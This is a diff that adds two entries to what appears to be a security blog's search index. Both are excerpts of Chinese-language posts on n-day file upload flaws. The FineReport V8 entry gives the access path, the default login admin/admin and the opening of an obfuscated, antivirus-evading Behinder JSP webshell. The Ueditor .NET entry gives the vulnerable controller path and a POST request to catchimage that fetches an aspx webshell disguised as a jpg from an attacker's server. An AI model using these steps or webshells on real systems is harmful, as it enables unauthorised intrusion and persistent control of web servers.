@@ -148,4 +148,16 @@ var store = [{
         "tags": ["windows","active-directory"],
         "url": "/hack-the-box/forest/",
         "teaser": null
+      },{
+        "title": "帆软V8文件上传漏洞",
+        "excerpt":"遇到的一个帆软V8文件上传漏洞，url得加上/WebReport/ReportServer?op=fs_load&amp;cmd=fs_signin才能正常访问，不然是空白页 弱口令admin/admin 进去之后长这样 启动水滴工具，访问本地43023端口，用这个模块上传冰蝎jsp免杀马 &lt;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*,sun.misc.*, sun.misc.BASE64Encoder,javax.crypto.spec.SecretKeySpec\" %&gt; &lt;%@ page import=\"java.io.BufferedReader\" %&gt; &lt;%@ page import=\"java.io.IOException\" %&gt; &lt;%@ page import=\"java.lang.reflect.Method\" %&gt; &lt;jsp:scriptlet&gt; String pp =\\u0022\\u0050\\u004f\\u0053\\u0054\\u0022; &lt;/jsp:scriptlet&gt; &lt;% class b6 extends \\u0042\\u0041\\u0053\\u0045\\u0036\\u0034\\u0044\\u0065\\u0063\\u006f\\u0064\\u0065\\u0072{} b6 b6 = new b6(); %&gt; &lt;%! public byte[] gg(byte[] a1,String k) { try { javax.crypto./*123*/Cipher c = javax.crypto.Cipher.\\u0067\\u0065\\u0074\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063e(\"AES/ECB/PKCS5Padding\"); c.init(javax.crypto.Cipher.DECRYPT_MODE,...","categories": ["vul"],
+        "tags": ["finereport","nday"],
+        "url": "/vul/finereport/",
+        "teaser": null
+      },{
+        "title": "Ueditor任意文件上传漏洞",
+        "excerpt":"Ueditor任意文件上传漏洞 0x00 漏洞概述 Ueditor是百度开发的一个网站编辑器，目前已经不对其进行后续开发和更新，该漏洞只存在于该编辑器的.net版本。其他的php、jsp、asp版本不受此UEditor的漏洞的影响。 0x01 POC 访问/ueditor/net/controller.ashx 控制器文件，当出现下图的时候表示编辑器成功运行，且漏洞存在。 但也不一定，比如上图的路径为/scripts/ueditor/net/controller.ashx 0x02 漏洞利用 现在vps上起一个http服务上面挂着一张jpg格式的aspx免杀马 Expoliet: POST /vul_ip/UEditor/net/controller.ashx?action=catchimage HTTP/1.1 Host: x.x.x.x Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 sec-ch-ua-platform: \"Windows\" sec-ch-ua: \"Google Chrome\";v=\"100\", \"Chromium\";v=\"100\", \"Not=A?Brand\";v=\"24\" sec-ch-ua-mobile: ?0 Connection: close...","categories": ["vul"],
+        "tags": ["ueditor","nday"],
+        "url": "/vul/ueditor/",
+        "teaser": null
       }]
